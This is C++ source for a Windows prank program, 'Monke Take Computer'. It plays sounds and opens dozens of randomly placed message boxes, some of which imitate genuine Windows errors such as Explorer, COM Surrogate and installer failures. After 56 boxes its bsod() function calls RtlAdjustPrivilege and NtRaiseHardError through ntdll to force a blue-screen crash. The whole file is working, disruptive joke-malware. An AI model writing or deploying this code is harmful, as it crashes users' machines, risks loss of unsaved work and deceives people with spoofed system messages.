#include "wtypes.h"
#include <iostream>
#include <random>
#include <Windows.h>
#include <winternl.h>
#include <string>
#include "resource.h"
using namespace std;

thread_local int MsgBox_X;
thread_local int MsgBox_Y;
thread_local int NumMsgBoxes = 0;
thread_local int Count = 0;
thread_local int Count2 = 0;

void GetMsgBoxResolution(int& boxx, int& boxy)
{
    RECT desktop;
    // Get a handle to the desktop window
    const HWND hDesktop = GetDesktopWindow();
    // Get the size of screen to the variable desktop
    GetWindowRect(hDesktop, &desktop);
    // The top left corner will have coordinates (0,0)
    // and the bottom right corner will have coordinates
    // (horizontal, vertical)
    std::random_device dev;
    std::mt19937 rng(dev());
    std::uniform_int_distribution<std::mt19937::result_type> boxdistx(1, desktop.right * 0.8626);
    std::uniform_int_distribution<std::mt19937::result_type> boxdisty(1, desktop.bottom * 0.81);
    boxx = boxdistx(rng);
    boxy = boxdisty(rng);
}

int bsod() {
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
    return 0;
}

static LRESULT CALLBACK CBTSetPosProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HCBT_CREATEWND)
    {
        CBT_CREATEWND* s = (CBT_CREATEWND*)lParam;
        if (s->lpcs->hwndParent == NULL)
        {
            s->lpcs->x = MsgBox_X;
            s->lpcs->y = MsgBox_Y;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int MessageBoxPos(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType, int X, int Y)
{
    HHOOK hHook = SetWindowsHookEx(WH_CBT, &CBTSetPosProc, NULL, GetCurrentThreadId());
    MsgBox_X = X;
    MsgBox_Y = Y;
    int result = MessageBox(hWnd, lpText, lpCaption, uType);
    if (hHook) UnhookWindowsHookEx(hHook);
    return result;
}

void randmsgbox(int rand) {
    int boxx = 0;
    int boxy = 0;
    GetMsgBoxResolution(boxx, boxy);
    if (rand == 1 || rand == 2) {
        PlaySound(MAKEINTRESOURCE(IDR_WAVE3), NULL, SND_RESOURCE | SND_ASYNC);
        MessageBoxPos(NULL, TEXT("MONKE!!!"), TEXT("Monke Take Computer!"), MB_ICONERROR | MB_OK, boxx, boxy);
    }
    else if (rand == 3 || rand == 4) {
        PlaySound(MAKEINTRESOURCE(IDR_WAVE2), NULL, SND_RESOURCE | SND_ASYNC);
        MessageBoxPos(NULL, TEXT("MONKE BREAK COMPUTER!!!"), TEXT("Break Computer!"), MB_ICONERROR | MB_OK, boxx, boxy);
    }
    else if (rand == 5) {
        PlaySound(MAKEINTRESOURCE(IDR_WAVE4), NULL, SND_RESOURCE | SND_ASYNC);
        MessageBoxPos(NULL, TEXT("COM Surragate has stopped working"), TEXT("COM Surragate"), MB_ICONINFORMATION | MB_OK, boxx, boxy);
    }
    else if (rand == 6) {
        PlaySound(MAKEINTRESOURCE(IDR_WAVE4), NULL, SND_RESOURCE | SND_ASYNC);
        MessageBoxPos(NULL, TEXT("Windows Explorer has stopped working"), TEXT("Windows Explorer"), MB_ICONINFORMATION | MB_OK, boxx, boxy);
    }
    else if (rand == 7) {
        MessageBoxPos(NULL, TEXT("The program can't start because MSVCR71.dll is missing from your computer. Try reinstalling the program to fix this problem."), TEXT("System Error"), MB_ICONERROR | MB_OK, boxx, boxy);
    }
    else if (rand == 8) {
        MessageBoxPos(NULL, TEXT("Error 1772. There is a problem with this Windows installer package. A program run as part of the setup did not finish as expected. Contact your support personnel or package vendor"), TEXT("Installer Information"), MB_ICONWARNING | MB_OK, boxx, boxy);
    }
}

void countManager2(int count) {
    if (count >= 1 && count <= 55) {
        //cout << "Count Manager 2: " << count << "\n"; //--DEBUGGING--
        std::random_device dev;
        std::mt19937 rng(dev());
        std::uniform_int_distribution<std::mt19937::result_type> distb(1, 8);
        randmsgbox(distb(rng));
    }
    else if (count == 56) {
        //cout << "Count Manager 1: " << count << " (bsod)"; //--DEBUGGING--
        bsod();
        //MessageBox(NULL, TEXT("BSSSSSSSOOOOOOOOOOOOOOOOODDDDDDDD"), TEXT("BSOD"), MB_ICONWARNING | MB_OK); //--DEBUGGING--
    }
}

static void CALLBACK TimerProc2(HWND, UINT, UINT_PTR, DWORD)
{
    if (NumMsgBoxes > 0)
    {
        --NumMsgBoxes;
        Count2++;
        countManager2(Count2);
    }
}

void _MessageBox2(int NumberOfMsgBoxes)
{
    int boxx = 0;
    int boxy = 0;
    GetMsgBoxResolution(boxx, boxy);
    NumMsgBoxes = NumberOfMsgBoxes;
    if (NumMsgBoxes > 0)
    {
        --NumMsgBoxes;
        UINT timer = SetTimer(NULL, 0, 150, &TimerProc2);
        if (timer) {
            MessageBoxPos(NULL, TEXT("MONKE!!!"), TEXT("Monke Take Computer!"), MB_ICONERROR | MB_OK, boxx, boxy);
            KillTimer(NULL, timer);
        }
    }
}

void countManager(int count) {
    //cout << "Count Manager 1: " << count << "\n"; //--DEBUGGING--
    if (count == 1) {
        Sleep(500);
        MessageBox(NULL, TEXT("Monke will now take over your computer."), TEXT("Monke Take Computer"), MB_ICONWARNING | MB_OK);
    }
    else if (count == 2) {
        _MessageBox2(60);
    }
}

static void CALLBACK TimerProc(HWND, UINT, UINT_PTR, DWORD)
{
    if (NumMsgBoxes > 0)
    {
        --NumMsgBoxes;
        Count++;
        countManager(Count);

    }
}

void _MessageBox(int NumberOfMsgBoxes)
{
    NumMsgBoxes = NumberOfMsgBoxes;
    if (NumMsgBoxes > 0)
    {
        --NumMsgBoxes;
        UINT timer = SetTimer(NULL, 0, 3000, &TimerProc);
        if (timer) {
            MessageBox(NULL, TEXT("Uh oh, you have summoned the Monke!"), TEXT("UH OH!"), MB_ICONWARNING | MB_OK);
            KillTimer(NULL, timer);
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), NULL, SND_RESOURCE | SND_ASYNC);
    _MessageBox(3);
}